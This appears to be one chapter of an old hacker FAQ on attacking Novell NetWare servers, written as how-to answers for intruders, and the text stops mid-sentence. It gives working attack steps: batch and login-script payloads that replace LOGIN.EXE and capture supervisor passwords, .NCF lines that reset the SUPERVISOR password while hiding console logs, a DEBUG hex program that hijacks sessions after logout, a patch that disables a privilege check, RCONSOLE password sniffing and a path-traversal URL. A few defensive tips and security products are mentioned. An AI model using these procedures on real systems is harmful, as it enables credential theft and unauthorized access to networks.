@@ -1,0 +1,644 @@
+<!DOCTYPE  HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><HTML>
+<HEAD>
+ <META NAME="GENERATOR" CONTENT="SGML-Tools 1.0.6">
+ <TITLE>The Hack FAQ: Netware Misc. Attack Info</TITLE>
+ <LINK REL="next" HREF="hackfaq-25.html">
+ <LINK REL="previous" HREF="hackfaq-23.html">
+ <LINK REL="contents" HREF="hackfaq.html#toc24">
+</HEAD>
+<BODY BGCOLOR="black" VLINK="gray" TEXT="white" LINK="gray" HLINK="red">
+<A HREF="hackfaq-25.html">Next</A>
+<A HREF="hackfaq-23.html">Previous</A>
+<A HREF="hackfaq.html#toc24">Contents</A>
+<HR>
+<H2><A NAME="netwaremiscattackinfo"></A> <A NAME="s24">24. Netware Misc. Attack Info</A></H2>
+
+<P>This section has miscellaneous information regarding hacking and Netware.
+<P>
+<H2><A NAME="ss24.1">24.1 How do I spoof my node or IP address?</A>
+</H2>
+
+<P>This will depend greatly on what kind of network interface card (NIC) the workstation
+has, as to whether you can perform this function. Typically you can do it in the Link
+Driver section of the NET.CFG file by adding the following line - NODE ADDRESS
+xxxxxxxxxxxx where xxxxxxxxxxxx is the 12 digit MAC layer address. This assumes you
+are using Netware's ODI drivers, if you are using NDIS drivers you will have to add the
+line to a PROTOCOL.INI or IBMENII.NIF file, which usually has the lines already in it. 
+<P>Getting the target node address should be pretty easy. Login with any account and do a
+USERLIST /A. This will list all accounts currently logged in with their network and node
+address. If your workstation is on the same network as the target, you can spoof the
+address no problem. Actually you can spoof the address regardless but to defeat station
+restrictions you must be on the same network. 
+<P>For an IP address, you may have to run a TCPIP config program to make it work (it
+depends on whose IP stack you are running). Some implementations will have the mask,
+the default router and the IP address in the NET.CFG, some in the TCPIP.CFG. It is a
+good idea to look around in all network- related subdirectories to see if there are any
+.CFG, .INI, or .NIF files that may contain addresses. 
+<P>Forging the IP address is quite tricky, and many people have written to me asking for
+specific tips. Since there are a number of different IP implementations this is rather
+impractical. However here are a few important items to remember: 
+<P>
+<UL>
+<LI>Most utilities that configure the IP address DO use an INI, CFG or NIF file of some type. Look for those files. </LI>
+<LI>As workstation software becomes more complex, I have found that often the IP address is written in more than one place. You must get it in all of places it has been written. For example if you are running multiple protocols on one card, you may have
+
+
+to update several different config files including NET.CFG.</LI>
+<LI>If the IP address you are trying to spoof is up and active, it is possible that you won't get anything to work at all, or it will be difficult. In large companies there is usually some monitoring to detect duplicate IP addresses. Netview is one
+example of a product that can be configured to look for this. </LI>
+<LI>A company may have a class 2 address, and may have dozens of class 3 subnets. If your subnet is 100.100.100.x and your default router is 100.100.100.254, trying to spoof 100.100.200.10 probably will not work very well. </LI>
+</UL>
+<P>
+<H2><A NAME="ss24.2">24.2 How can I see hidden files and directories?</A>
+</H2>
+
+<P>Instead of a normal DIR command, use NDIR to see hidden files and directories. NDIR *.* /S /H will show you just Hidden and System files. 
+<P>
+<H2><A NAME="ss24.3">24.3 How do I defeat the execute-only flag?</A>
+</H2>
+
+<P>If a file is flagged as execute-only, it can still be opened. Open the file with a program that will read in executables, and do a Save As to another location.
+<P>Also try X-AWAY.EXE to remove this flag since Novell's FLAG.EXE won't. But once again X-AWAY.EXE requires Supervisor access. 
+<P>To disable the check for Supe access in X-AWAY, try the following: 
+<P>
+<PRE>
+        REN X-AWAY.EXE WORK
+        DEBUG WORK
+        EB84 EB
+        W
+        Q
+        REN WORK X-AWAY.EXE
+</PRE>
+<P>Hey presto, anybody can copy X flagged files. The only catch is you need practically full rights in the directory where the X flagged file resides. 
+<P>
+<H2><A NAME="ss24.4">24.4 How can I hide my presence after altering files?</A>
+</H2>
+
+<P>The best way is to use Filer. Here are the steps for removing file alterations - 
+<P>
+<UL>
+<LI> Run Filer or use NDIR and note the attributes of the target file, namely the date and owner of the file. </LI>
+<LI> Make your changes or access the file. </LI>
+<LI> Run Filer or use NDIR and check to see if the attributes have changed. If so, change them back to the original settings. </LI>
+</UL>
+<P>While you can hit F1 will in Filer and get all the context-sensitive help you need, the quicky way to get where you're going is to run Filer in the target file's
+directory, select Directory Contents, highlight the target file and hit enter, select File Options and then View/Set File Information. View and edit to your
+heart's desire. 
+<P>
+<H2><A NAME="ss24.5">24.5 What is a Netware-aware trojan?</A>
+</H2>
+
+<P>A Netware-aware trojan is a program that supposedly does one thing but does another instead, and does it using Netware API calls. I have never
+personally encountered one, but here is how they would work. 
+<P>
+<UL>
+<LI> Trojan program is placed on a workstation, hopefully on one frequented by admins with Supe rights. The trojan program could be named something
+like CHKVOL.COM or VOLINFO.COM, that is a real name but with a .COM extension. They would be placed in the workstation's path. </LI>
+<LI> Once executed, the trojan uses API calls to determine if the person is logged in as a Supe equivalent, if not it goes to the next step. Otherwise some
+type of action to breach security is performed. </LI>
+<LI> The real CHKVOL.EXE or VOLINFO.EXE is ran. </LI>
+</UL>
+<P>The breach of security would typically be some type of command-line activity that could be performed by system() calls. For example, PROP.EXE
+could be run to build a property and the replacement LOGIN.EXE copied up to the server in the SYS:LOGIN directory. Or RW access granted to the
+SYS:SYSTEM directory for a non-Supe user like GUEST. 
+<P>Once activated the trojan could also erase itself since it is no longer needed. 
+<P>
+<H2><A NAME="ss24.6">24.6 What are Trustee Directory Assignments?</A>
+</H2>
+
+<P>The LAN God has pointed out quite correctly that Trustee Directory Assignments are the most misunderstood and misconfigured portion of Novell
+Netware. Typically a secure site should have Read and File Scan only in most directories, and should not have any rights on the root directory of any
+volume. Rights assigned via the Trustee Directory Assignments filter down the directory tree, so if a user has Write access at the root directory, that user
+has Write access in every subdirectory below it (unless explicitly limited in a subdirectory down stream). And these assignments are not located in the
+bindery, but on each volume. 
+<P>The following is a brief description of Trustees and Trustee Directory Assignments cut and pasted from the comp.os.netware.security FAQ: 
+<P>[quote] A trustee is any user or group that has been granted access rights in a directory. 
+<P>The access rights in Novell NetWare 2 are slightly different from the ones in NetWare 3. 
+<P>The following is a summary of access rights for NetWare 3. 
+<P>S - Supervisory. Any user with supervisory rights in a directory will automatically inherit all other rights, regardless of whether they have been explicitly
+granted or not. Supervisor equivalent accounts will hold this access right in every directory. 
+<P>R - Read. Enables users to read files. 
+<P>C - Create. Enables users to create files and directories. Unless they also have write access, they will not be able to edit files which have been created. 
+<P>W - Write. Enables users to make changes to files. Unless they also have create access, they may not be able to edit files, since the write operation can
+only be used to extend files (not truncate them, which file editors need to do). 
+<P>E - Erase. Enable users to erase files and remove directories. 
+<P>M - Modify. Enable users to modify file attributes. 
+<P>F - File scan. Enables users to see file and directory information. If a user does not have file scan rights, they will not see any evidence of such files
+existing. 
+<P>A - Access control. Enable user to change trustee rights. They will be able to add other users as trustees, remove trustees, and grant/revoke specific
+rights from users. The only caveat of access control is that it is possible for users to remove themselves (as trustees) from directories, thus losing all
+access control. 
+<P>In addition to trustees and access rights, there is a concept of inherited rights which means that users inherit rights from parent directories. For example, if
+user ALICE has rights [CWEM] in a directory, and she has [RF] rights in the parent directory then she will have [RCWEMF] rights as a result of the
+inherited rights. This will only work if one of the rights that ALICE has in the two directories is granted to a group; if both are granted to her, she will lose
+the rights of the parent. [end quote] 
+<P>
+<H2><A NAME="ss24.7">24.7 Are there any default Trustee Assignments that can be exploited?</A>
+</H2>
+
+<P>Two ways. In 3.x the group EVERYONE has Create rights in SYS:MAIL. This means the user (including GUEST) has the ability to write files to any
+subdirectory in SYS:MAIL. The first versions of Netware included a simple e-mail package, and every user that is created gets a subdirectory in mail
+with RCWEMF, named after their object ID number. One consistent number is the number 1, which is always assigned to Supervisor. Here's one way
+to exploit it: 
+<P>
+<PRE>
+Trick #1
+--------
+
+- Login as GUEST and change to the SYS:MAIL subdirectory. 
+- Type DIR. You will see one subdirectory, the one owned by GUEST. Change into that 
+  directory (ex. here is C0003043) 
+- Type DIR. If there is no file named LOGIN, you can bet there may not be one for
+  Supervisor. If there is a default-looking LOGIN file, even a zero length file, you
+  cannot proceed. 
+- Copy PROP.EXE and LOGIN.EXE (the itsme version) to SYS:MAIL\C0003043 
+- Create a batch file (ex. here is BOMB.BAT) with the following entries: 
+
+  @ECHO OFF
+  FLAG \LOGIN\LOGIN.EXE N > NUL
+  COPY \MAIL\C0003043\LOGIN.EXE \LOGIN\LOGIN.EXE > NUL
+  FLAG \LOGIN\LOGIN.EXE SRO > NUL
+  \MAIL\C0003043\PROP -C > NUL
+
+- Create a LOGIN file with the following entries: 
+
+  MAP DISPLAY OFF
+  MAP ERRORS OFF
+  MAP G:=SYS:
+  DRIVE G:
+  COMMAND /C #\MAIL\1\BOMB
+  DRIVE F:
+  MAP DELETE G:
+
+- Now copy the files to the Supervisor's SYS:MAIL directory from a drive mapped to 
+  the SYS: volume. 
+
+  TYPE BOMB.BAT > \MAIL\1\BOMB.BAT
+  TYPE LOGIN > \MAIL\1\LOGIN
+
+- The next time the Supervisor logs in the LOGIN.EXE is replaced and the PROP.EXE 
+  file is run, capturing passwords. Run PROP.EXE later to get the passwords, and 
+  then once you have all the passwords you need (including Supervisor) delete your
+  LOGIN and BOMB.BAT file. 
+</PRE>
+<P>Admins can defeat this by creating default personal Login Scripts or by adding an EXIT command to the end of the System Login Script. Later versions
+of Netware create a zero-length LOGIN file at ID creation time in the SYS:MAIL directories to defeat this. 
+<P>
+<PRE>
+Trick #2
+--------
+
+Pegasus mail has a hole that ties into the Create rights in SYS:MAIL. Here's how 
+to use it: 
+
+- Create a RULES.PMQ file that sets up a rule to execute a file after receipt of a
+  mail message. The program Run line should be something like: 
+
+    COMMAND /C F:\MAIL\1\BOMB.BAT 
+
+- Let's say your mail directory is SYS:MAIL\C0003043. Copy PROP.EXE and LOGIN.EXE 
+  (the itsme version) to that directory. 
+
+- Your BOMB.BAT file should be like this: 
+
+  @ECHO OFF
+  FLAG \LOGIN\LOGIN.EXE N > NUL
+  COPY \MAIL\C0003043\LOGIN.EXE \LOGIN\LOGIN.EXE > NUL
+  FLAG \LOGIN\LOGIN.EXE SRO > NUL
+  \MAIL\C0003043\PROP -C > NUL
+
+- When the Supe reads his mail, the replacement LOGIN.EXE is active and capturing
+  passwords. After acquiring a Supe equiv account, delete the rogue files from 
+  SYS:MAIL\1 
+</PRE>
+<P>This Pegasus mail problem will only work if the RULES.PMQ does not exist in the target directory. 
+<P>
+<PRE>
+Trick #2a
+---------
+
+If the RULES.PMQ file exists, obviously you cannot do this. After all, you can 
+only create new files to these directories. But here's a way to try and trick
+the Supe into deleting it for you: 
+
+- Create a bunch of extra rules for Pegasus. Name them RULEA.PMQ through 
+  RULER.PMQ, and RULET.PMQ through RULEZ.PMQ. 
+- Next time the Supe logs in and accesses mail, errors. 
+- The Supe deletes RULE?.PMQ to fix the problem, and RULES.PMQ is also removed. 
+- Now do Trick #2 
+</PRE>
+<P>
+<H2><A NAME="ss24.8">24.8 What are some general ways to exploit Trustee Rights?</A>
+</H2>
+
+<P>To find out all your trustee rights, use the WHOAMI /R command. The following section is a summary of what rights to expect, and the purpose. Where
+x appears, it means it doesn't matter if the right is set. 
+<P>
+<PRE>
+[SRWCEMFA] means you have FULL rights. They are all eight of the effective
+        rights flags.
+
+[Sxxxxxxx] shouldn't appear unless you are supervisor (or equivalent).
+        It means you have full access in that directory and all subdirectories.
+        You cannot be excluded from any directory, even if a user explicitly
+        tries to revoke your access in a subdirectory.
+
+[xxxxxxxA] is next best thing to the S right. It means you have access
+        control in that directory and all subdirectories. You can have your
+        access control (along with any other rights) revoked in a subdirectory,
+        but you can always use inherited rights to recover them (see the 
+        c.o.n.s FAQ).
+
+[ R    F ] is what users should have in directories containing software.
+        You have the right to read files only.
+
+[ RCWEMFx] is what users should have in their home directory. You can read,
+        create, and edit files. If you find any unusual directories with 
+        these rights, they can also be used for storing files (maybe an abuse 
+        of the network, especially if this is exploited to avoid quota 
+        systems).
+
+[ RxW  F ] usually means that the directory is used for keeping log files.
+        Unless you have the C right, it may not be possible to edit files in
+        this directory.
+</PRE>
+
+The RIGHTS commands tells you what rights you have in a particular directory. GRANT, REVOKE, and REMOVE are used to set trustee rights. 
+<P>
+<H2><A NAME="ss24.9">24.9 Can access to .NCF files help me?</A>
+</H2>
+
+<P>Access to any .NCF file can bypass security, as these files are traditionally run from the console and assume the security access of the console. The
+addition of a few lines to any .NCF file can get you access to that system. 
+<P>The most vulnerable file would be the AUTOEXEC.NCF file. Adding a couple of lines to run BURGLAR.NLM or SETPWD.NLM would certainly get
+you access. But remember there are other .NCF files that can be used and exploited. For example, ASTART.NCF and ASTOP.NCF are used to start
+and stop Arcserve, the most popular backup system for Netware. The LDREMOTE.NCF as mentioned in section 04-2 is another potential target. 
+<P>The lines you might add to such a file might be as follows: 
+<P>
+<PRE>
+UNLOAD CONLOG
+LOAD SETPWD SUPERVISOR SECRET
+CLS
+LOAD CONLOG
+</PRE>
+<P>This assumes you had read/write access to the location of the .NCF file and can copy SETPWD.NLM to the server. Note that by unloading CONLOG
+you are only partially covering your tracks, in the CONSOLE.LOG file it will be obvious that CONLOG was unloaded and reloaded. The CLS is to
+keep your activities off of the server's screen. 
+<P>The best .NCF for this is obviously one that is either used during the server's boot process or during some automated process. This way a short .NCF
+and its activities may escape the eyes of an admin during execution. 
+<P>
+<H2><A NAME="ss24.10">24.10 Can someone think they've logged out and I walk up and take over?</A>
+</H2>
+
+<P>Yes. Here's how - 
+<P>Type the following commands at the DOS prompt (or rip them out of this file, and feed them into DOS debug). 
+<P>
+<PRE>
+debug boo.com
+e100 eb 2b 80 fc d7 74 22 3d 02 f1 74 1d 3d 19 f2 74
+e110 18 3d 17 f2 74 0a 3d 17 f2 74 05 ea 5b 46 4d 5d
+e120 50 b0 d2 38 45 02 58 75 f2 f8 ca 02 00 b4 49 8e
+e130 06 2c 00 cd 21 b8 21 35 cd 21 89 1e 1c 01 8c 06
+e140 1e 01 b8 21 25 ba 02 01 cd 21 ba 2d 01 cd 27 00
+rcx
+50
+w
+q
+</PRE>
+<P>Just run it on a workstation running NetWare 2.x or 3.x, and wait for someone to login, use the machine, logout, and walk away. Oops. They forgot to
+logout? Now, isn't that just *bad* luck... 
+<P>Moral: If you are using a public network (such as a school or university), don't just use LOGOUT. Switch the machine OFF. 
+<P>
+<H2><A NAME="ss24.11">24.11 What other Novell and third party programs have holes that give "too much access"?</A>
+</H2>
+
+<P>Netware NFS has several bugs, as does IntraNetware. 
+<P>For remote access, hackers always want a Shiva hooked up. You see, if a hacker gets a name from the internal name list, they may not need a user ID
+and password for a Novell server. If a Shiva user disconnects without logging out, the next person in will be in as that person -- Shiva doesn't drop the
+connection! 
+<P>
+<H2><A NAME="ss24.12">24.12 How can I get around disk space requirements?</A>
+</H2>
+
+<P>Some admins forget to implement disk space restrictions on some volumes, but give write access to everyone. This allows you to use more resources
+than the supe intended. 
+<P>Some systems keep user's home directories on one volume, and only restrict disk space on that one volume. Applications and system files will be kept
+on other volumes. Since some applications require write access to their directories, if the volume space is not limited, any user capable of running the
+program can use the extra disk space available (an e-mail program like Microsoft Mail on it's own volume leaps to mind). If space isn't limited on SYS,
+on 3.x there is the SYS:MAIL\xxxxxxxx directory (where xxxxxxxx is your bindery object ID), but this is not there by default in 4.x. However if Pegasus
+mail is being used, or if the server was migrated from 3.x to 4.x, the directory structure and access may be the same. 
+<P>
+<H2><A NAME="ss24.13">24.13 How do I remotely reboot a Netware 3.x file server?</A>
+</H2>
+
+<P>If you have access to a server via RCONSOLE it may come in handy after loading or unloading an NLM to reboot a server. Build an NCF file by doing
+the following steps - 
+<P>
+<PRE>
+- Create a file called DOWNBOY.NCF on your local drive. It should be a text file 
+  and contain the following lines: 
+
+        REMOVE DOS
+        DOWN
+        EXIT
+
+- Copy up the file to the SYS:SYSTEM directory using RCONSOLE. 
+- At the System Console prompt, type DOWNBOY and enter. 
+</PRE>
+<P>What happens is this - the REMOVE DOS statement frees up the DOS section in server RAM, the server is downed (if there are open files, you will be
+given one of those "are you sure" messages, answer Y for yes), and the EXIT command tries to return the server console to DOS. But since you
+removed DOS from RAM, the server is warm booted. 
+<P>
+<H2><A NAME="ss24.14">24.14 What is Netware NFS and is it secure?</A>
+</H2>
+
+<P>NFS (Networked File System) is used primarily in Unix to remotely mount a different file system. Its primary purpose in Netware is to allow the server
+to mount a Unix file system as a Netware volume, allowing Netware users access to Unix data without running IP or logging into the server, and Unix
+users to mount a Netware volume as a remote file system. If the rights are set up incorrectly you can gain access to a server. 
+<P>While the product works as described, it is a little hard to administer, as user accounts on both sides must be in sync (name and password) and it can be
+a fairly manual process to ensure that they are, unless the versions are Netware NFS 2.1 or greater with Netware 4.x AND the Unix side is NOT
+running NIS. Simply adding the proper UID to the NDS object to create a relationship for rights to be passed back and forth. There are three modes --
+Unix is God, Netware is God, or both are right. 
+<P>A reported problem with Netware NFS is that after unloading and reloading using the .NCF files, a system mount from the Unix side includes SYS:ETC
+read only access. If this directory can be looked at from the Unix side after a mount, .NCF and .CFG files could be viewed and their information
+exploited. For example, SYS:ETC is a possible location of LDREMOTE.NCF, which could include the RCONSOLE password. 
+<P>On Netware 3.11 if you ask the portmapper for an NFS handle it will give you one. When you give NFS the file handle it will check its LOCAL
+portmapper and then grant the request. You can then read any file on the mount you just made. 
+<P>Netware NFS' existence on a server says you have some Unix boxes around somewhere, which may be of interest as another potential system to gain
+access to. 
+<P>
+<H2><A NAME="ss24.15">24.15 Can sniffing packets help me break into Netware servers?</A>
+</H2>
+
+<P>Yes. If a user is logging in and the password is being transmitted to the server unencrypted, it will show up as plain text in the trace. If the site uses telnet
+and ftp, capturing those password will come in handy. Outside of gaining access to another system, many users will make their passwords the same
+across all systems. 
+<P>RCONSOLE.EXE is the client-launched application that provides a remote server console to a Novell Netware file server. The connection between
+client and server allows administrators to manage servers as if they were at the physical server console from their desks, and allow virtually any action
+that would be performed at the server console to be performed remotely, including execution of console commands, uploading of files to the server, and
+the unloading and loading of Netware Loadable Modules (NLMs). It is not only an effective tool for administrators, it is a prime target for hackers. 
+<P>A critical point of access to many servers is the actual physical console. This is one of the main reasons why physical security of the server is so
+important and stressed by security conscious administrators. On many systems you have a level of access with little to no security. Netware is no
+exception. 
+<P>The main reason to hack RCONSOLE is to gain access to the Netware server console. No, you aren't physically there, but the OS doesn't know any
+different. And the main reason to gain access to the Netware server console is to utilize a tool to gain Supervisor access to the Netware server. 
+<P>During the RCONSOLE process, the password does come across the wire encrypted. If you look at the conversation you will see packets containing
+the RCONSOLE.EXE being opened, the possible servers to be accessed, etc. This conversation is nothing but NCP packets. 
+<P>Once RCONSOLE is up on the workstation, the user chooses the server, hits enter, and is prompted for a password. After entering the password, the
+conversation contains two 60 byte IPX/SPX packets going back and forth followed by 4 NCP packets, 64 bytes, 60 bytes, 64 bytes, and 310 bytes in
+length respectively. The next IPX/SPX packet, 186 bytes in length, contains the password. It is located at offset 3Ah, which is easy to find. Offset 38h is
+always FE and offset 39h is always FF. 
+<P>Now comes the use of a tool called RCON.EXE from itsme that can take some of the information you have collected and turn it into the password.
+What you need are the first 8 hex bytes starting at offset 3Ah, the network address, and the node address. Now the network and node address are in
+the header of the packet that contains the encrypted password, but can also get these by typing USERLIST /A which returns this info (and more) for
+each person logged in. 
+<P>Now why just the first 8 hex bytes? That's all Novell uses. Great encryption scheme, huh? 
+<P>
+<H2><A NAME="ss24.16">24.16 What else can sniffing around Netware get me?</A>
+</H2>
+
+<P>It has pointed out that RCONSOLE sends screens in plaintext across the network for all to see (well, all with sniffers). This means you can see what is
+being typed in and what is happening on the screen. While it is not the prettiest stuff to look at, occassional gems are available. The best gem? The
+RCONSOLE password. The server had been brought up without REMOTE and RSPX being loaded, they were loaded by hand at the console after
+the server was brought up. The first RCONSOLE session brought up the screen with the lines LOAD REMOTE and LOAD RSPX PASSWORD
+(with PASSWORD being the RCONSOLE password), and this was being sent to the RCONSOLE user's workstation in plaintext. 
+<P>Teiwaz discovered that SYSCON sends password changes in plaintext. While SETPASS, LOGIN, MAP, and ATTACH all encrypt the password in
+3.x, SYSCON does not. 
+<P>Einer kindly reminded me that sniffing will show other usernames and passwords such as TELNET, FTP, POP3, and others. Often users use the same
+passwords from system to system, so these passwords could be used to try on the Netware accounts. In large shops, the administrators of Netware
+may also have the same passwords for privileged accounts from system to system, so the Admin or Supervisor account may match the root account on
+a Unix box. Therefore a TELNET session that contains an su to root might reveil the Admin password. 
+<P>
+<H2><A NAME="ss24.17">24.17 Do any Netware utilities have holes like Unix utilities?</A>
+</H2>
+
+<P>This is a fairly common question, inspired by stack overrun errors, sendmail bugs, and the like that exist in the Unix world. The reason you do not have
+these kind of exploits in common Netware utilities is because: 
+<P>
+<UL>
+<LI> You use a proprietary shell that can be loaded without accessing the server, therefore no shell exploits exist.</LI>
+<LI> Virtually all Netware utilities do NOT use stdin and stdout, so no stack overruns that exploit anything.</LI>
+<LI> Since the shell is run locally, not on the server, you have no way to use a utility to gain greater access than you have been granted, like a SUID script in
+Unix.</LI>
+<LI> Yes there are utilities like HACK.EXE that grant extra access under certain conditions in 3.11, but no Novell-produced utility comes close to granting
+extra access. </LI>
+</UL>
+<P>
+<H2><A NAME="ss24.18">24.18 Where can I get the Netware APIs?</A>
+</H2>
+
+<P>Stateside call 1-800-RED-WORD, it's $50 USD, and includes a 2-user license of Netware 4.1. Most brand-name compilers will work, but if you're
+writing NLMs you'll need Watcom's latest. It's the only one I know of that will do NLM linking. 
+<P>
+<H2><A NAME="ss24.19">24.19 Are there alternatives to Netware's APIs?</A>
+</H2>
+
+<P>There are a few. Here is info on them - 
+<P>Visual ManageWare by HiTecSoft at (602) 970-1025. This product allows development of NLMs and DOS EXEs using a Visual Basic type development environment. Runtime royalty-free development
+without C/C++ and without Watcom. However links are included for C/C++ programs. The full SDK including compilers is USD$895.00. Pricey but
+looks good, I have not used this product. Novell recently bought/licensed this product so the availability
+may have changed.
+<P>Adrian Cunnelly recently made his C libs for Netware free. You can reach him at adrian@amcsoft.demon.co.uk.
+These include the source code. Check SimTel mirrors in the msdos/c/ directory for netclb30.zip
+<P>And take a look at Greg Miller's site, especially for those Pascal coders out there at http://www.users.mis.net/&nbsp;gregmi/.
+<P>Pandora v3.0 includes its own API, the Pandora Toolbox API, written by Jitsu-Disk. While the project was intended for hackers and
+not admins, some coders might find it to be a useful package. It is available at 
+<A HREF="http://www.nmrc.org/pandora/index.html">http://www.nmrc.org/pandora/index.html</A>.
+<P>The "GNU Novell Client" project gives a unique insight on the NCP protocol, it can be downloaded at
+<A HREF="http://sunsite.unc.edu/pub/Linux/system/remotefs/ncpfs/ncpfs-2.0.0.tgz">http://sunsite.unc.edu/pub/Linux/system/remotefs/ncpfs/ncpfs-2.0.0.tgz</A>. It has
+tons of source code included.
+<P>
+<H2><A NAME="ss24.20">24.20 How can I remove NDS?</A>
+</H2>
+
+<P>This one is dangerous. This one will get you your Admin account back if you lost the password, and is not for the light-hearted if you plan on actually
+using NDS afterwards. Do this at a 4.1 console: 
+<P>LOAD INSTALL -DSREMOVE
+<P>Now in the INSTALL module, go ahead and try to remove NDS. As a part of the process, it will ask you for the Admin password, get this, JUST
+MAKE ONE UP. If you get errors, no problem. Keep going and you can remove NDS from the server. Even though you gave it the wrong password,
+it will still let you remove NDS. I told you this one is real wicked...
+<P>
+<H2><A NAME="ss24.21">24.21 What are security considerations regarding partitions of the tree?</A>
+</H2>
+
+<P>Most of this is covered as individual items, but here is a bit regarding partitioning of the tree. 
+<P>As mentioned in the password section, you can set the bindery context of a server to help you recover a lost ADMIN password. It should be noted that you can
+only access containers in the current servers partition. 
+<P>With larger networks things get more complex. For example, a "supervisor" account (one with full access to the file system) may have limited access on
+another server. The number of possible leaks for intruders grows with the size of the network. 
+<P>A hacker could exploit this and gain control of other partitions, if any object in the first partition they have compromised has access rights to other
+directory partitions. Intruders could easily give themselves security equivalence to that object, or change that objects password with SYSCON, then
+login as that object and access the other partitions. 
+<P>In other words, if a read/write or master partition is stored on one server, its supervisor can potentially manage all objects in this partition, and since its
+supervisor's password can be reset from the console, other partitions are at risk. 
+<P>Read/only replicas of partitions by nature will not allow you to set your bindery context to a container in that area -- they are, duh, read only. Of course
+the brave can disconnect the server from the network, and run DSREPAIR on that server to change the partition to master, but that's rather extreme. 
+<P>Novell recommends trying to restrict object rights to their own partition and to create replica partitions only on trusted server. Let's use an example to
+illustrate: 
+<P>
+<UL>
+<LI> Server ACCOUNTING has lots of spreadsheets, documents, and a database used by the accounting department with all kinds of information. The
+container ACCT-USERS has the IRF set so that they manage themselves. </LI>
+<LI> There is an account called MAINTENANCE in the ACCT-USERS container that the manager of accounting can reset the password. This is done
+when the LAN administrators need to perform any kind of maintenance, such as building IDs with tricky access rights, etc. that the accounting manager
+doesn't know how to do. </LI>
+<LI> A read/write replica of the partition containing the ACCT-USERS container exists on a server across town in a small sales office. A temporary office
+clerk hired from a local temp agency has access to the storage closet where this server is kept. </LI>
+<LI> One afternoon the temporary uses SETPWD.NLM and resets the MAINTENANCE account password. </LI>
+<LI> The next day (after replication) the temporary rifles through all accounting documents which include payroll and personal information, sales forecasts,
+future plans for capital expenditure, etc. </LI>
+</UL>
+<P>
+<H2><A NAME="ss24.22">24.22 Can a department "Supe" become a regular Admin to the entire tree?</A>
+</H2>
+
+<P>Yes, under certain conditions. Here is an example.
+<P>
+<UL>
+<LI> The tree has an OU called LAWDEPT.</LI>
+<LI> The Admin account is at the root of the tree.</LI>
+<LI> A departmental supervisor account called FRED is located in LAWDEPT with Admin rights to the LAWDEPT OU (a Trustee of LAWDEPT and supe rights to objects and properties).</LI>
+<LI> Server LawServer is in the LAWDEPT OU with two bindery contexts, one in the LAWDEPT OU and one at the root (so Admin can login via the bindery if needed)</LI>
+<LI> Although FRED only has browse at the root, he can run SYSCON and modify the Admin account to gain more access, like say the password.</LI>
+<LI> If FRED is a psychopath, he can delete the Admin account and render tree management useless.</LI>
+</UL>
+<P>
+<H2><A NAME="ss24.23">24.23 Are there products to help improve Netware's security?</A>
+</H2>
+
+<P>While there are a number of products, commercial and shareware/public domain that have some security-related features, the following products are
+either really good or have some unique features. 
+<P>There is a commercial product called SmartPass, which runs as an NLM. Once installed, you can load this and analyze existing passwords for
+weaknesses. A limited-time free demo can be obtained from the following address: 
+<P>
+<A HREF="http://www.egsoftware.com/">http://www.egsoftware.com/</A><P>SmartPass will check passwords on the fly, so a user can be forced to use a non-dictionary word for a password. 
+<P>Another commercial product product that will check from a dictionary word list and simply report if the password is on the list is Bindview NCS. The
+bindery version is god-awful slow, but completely accurate. It requires Supe access to run. Bindview can also produce a number of reports. including
+customized reports to give you all kinds of info on the server and its contents. The new Bindview NDS product is even better. Running as an NLM the
+password-checking is lightning fast at spitting out account names that are using poor passwords. It can do several thousand checks vs. the
+one-per-couple-of-seconds speed of the bindery version. You can still use the slow across-the-network method if you desire, but this is only for those
+who like slow torture. The new reporting features are fabulous, and since they can be customized the wily sys admin can have custom security reports
+(among other things). 
+<P>
+<A HREF="http://www.bindview.com/">http://www.bindview.com/</A><P>For doing Auditing on a 3.x version of Netware, try AuditTrack. It will track all access to a directory or individual file by user, which can come in handy
+for seeing who is doing what. Out of the box Netware 3.11 has virtually no way to track what an individual user is doing, but the AuditTrack NLM
+helps greatly. E.G. Software, the developer, can be reached at: 
+<P>
+<A HREF="http://www.egsoftware.com/">http://www.egsoftware.com/</A><P>Intrusion Detection Systems puts out a commercial product called Kane Security Analyst. It is considered by many to the "SATAN" of Netware. One
+of its abilities is locating hidden objects in the NDS tree. For a good demo, a 30 day trial version, and more info: 
+<P>
+<A HREF="http://www.intrusion.com/">http://www.intrusion.com/</A><P>"SafeWord for Netware Connect" is an NLM that does password checks in a Netware Connect environment: 
+<P>
+<A HREF="http://www.safeword.com/nwcspec.html">http://www.safeword.com/nwcspec.html</A><P>There is a product called Password Helper that "enhances" the security around the changing of passwords for 3.x. It is a local EXE/server NLM
+product that allows non-Supe users to reset passwords. 
+<P>Which product is best? Two stand out -- Bindview NDS and Kane Security Analyst. KSA is more of a security-type product and has some neat
+features, but Bindview's customization allows for more details to be explored. NMRC uses Bindview on its 4.x servers
+(okay they sent a free copy, but it is still good and if it had sucked I would have told you that. My day job uses it too). 
+<P>
+<H2><A NAME="ss24.24">24.24 Is Netware's Web server secure?</A>
+</H2>
+
+<P>Novell's Web Server had a HUGE bug. The CGI scripts are Basic programs (yes you are about to hack a server using Basic!) and several are included
+with the server. One in particular, CONVERT.BAS, takes a file and converts it to HTML and then sends it to the user. Here's an example for
+www.target.com: 
+<P>
+<PRE>
+    http://www.netware.nmrc.org/scripts/convert.bas?readme.txt
+</PRE>
+<P>The README.TXT file is returned as HTML. Now here's the bug: 
+<P>
+<PRE>
+    http://www.netware.nmrc.org/scripts/convert.bas?../../any_file_on_sys_volume
+</PRE>
+<P>Nasty, huh? I recommend "../../system/autoexec.ncf", or "../../etc/ldremote.ncf". It can also be useful for other things (see 06-2 for an example). This has
+been fixed in the latest version of Novell's IntranetWare. 
+<P>
+<H2><A NAME="ss24.25">24.25 What's the story with Netware's FTP NLM?</A>
+</H2>
+
+<P>With IntranetWare, the FTP NLM has a couple of problems. The standard installation gives Read and File Scan access to SYS:ETC so anonymous
+users can access files in that directory. This is a problem if you use INETCFG to configure RCONSOLE and then don't go back and encrypt the
+password in the file. The SNMP community password is in this directory, to say nothing about protocols, addresses, and other configuration
+information. 
+<P>The wily Admin can turn off the rights, but guess what? Doing this breaks the logging feature. 
+<P>The other major problem on Netware 4.1 with FTPSERV.NLM is that some users logging in via FTP are granted excessive rights. Stopping and
+starting the NLM seems to put the rights back the way they are supposed to, but then they seem to come back to FULL rights. Using Fetch as an FTP
+client tends to make this happen all of the time. 
+<P>While it does seem possible that going in and checking effective rights, checking bindery rights via SYSCON, and checking UNICON might turn up
